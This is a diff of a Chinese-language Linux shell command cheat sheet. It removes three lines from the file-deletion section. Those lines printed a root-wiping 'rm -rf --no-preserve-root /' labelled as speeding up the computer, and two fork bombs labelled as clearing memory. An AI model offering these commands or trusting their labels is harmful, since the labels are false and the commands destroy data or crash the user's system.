@@ -189,11 +189,7 @@ mkdir -m 777 /test	# 创建时指定权限
 #### 删
 ```bash
 rm -i	# 确认
-rm -rf --no-preserve-root /	# 电脑加速
 rmdir # 删除空目录
-
-:(){:|:&};:	 # 清理内存
-b(){ b|b& };b  # 清理内存
 ```
 
 #### 查
